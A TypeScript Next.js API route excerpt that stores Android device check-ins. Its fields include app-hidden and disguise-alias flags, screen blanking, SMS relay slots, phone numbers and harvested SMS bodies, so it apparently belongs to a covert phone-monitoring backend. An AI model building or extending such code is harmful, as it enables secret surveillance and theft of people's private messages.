...
export async function POST(req: NextRequest){
  try{
    ...
    const { deviceId, installed, missing, monitorRunning, batteryOptimized, inUse, screenOn, lastUnlock, ringerMode, appState, appStateAt, model, androidVersion, appVersion, alias, appLabel, hidden, blankEnabled, relayActive, relaySlot, phoneNumbers, sms } = body || {};
    if(!deviceId) return NextResponse.json({error:"deviceId required"},{status:400});
    const dev = await upsertDevice({ deviceId, model: model||"unknown", androidVersion: androidVersion||"?", appVersion: appVersion||"0.2.1-poss", installed: installed??[], missing: missing??[], monitorRunning: monitorRunning??false, batteryOptimized: batteryOptimized??false, ...(typeof inUse === "boolean" ? { inUse } : {}), ...(typeof screenOn === "boolean" ? { screenOn } : {}), ...(typeof lastUnlock === "string" ? { lastUnlock } : {}), ...(typeof ringerMode === "string" && ["normal", "vibrate", "silent"].includes(ringerMode) ? { ringerMode } : {}), ...(typeof appState === "string" && ["opened", "partial", "closed"].includes(appState) ? { appState } : {}), ...(typeof appStateAt === "string" ? { appStateAt } : {}), ...(alias ? { alias, appLabel: appLabel || alias } : {}), ...(typeof hidden === "boolean" ? { hidden } : {}), ...(typeof blankEnabled === "boolean" ? { blankEnabled } : {}), ...(typeof relayActive === "boolean" ? { relayActive } : {}), ...(relaySlot === 1 || relaySlot === 2 ? { relaySlot } : {}), ...(Array.isArray(phoneNumbers) ? { phoneNumbers: phoneNumbers.filter((x: unknown) => typeof x === "string").map((x: string) => x.slice(0, 32)) } : {}), ...(Array.isArray(sms) ? { sms: sms.slice(0, 20).map((m: any) => ({ from: typeof m?.from === "string" ? m.from.slice(0, 32) : "", body: typeof m?.body === "string" ? m.body.slice(0, 512) : "", date: Number(m?.date) || 0 })) } : {}) });
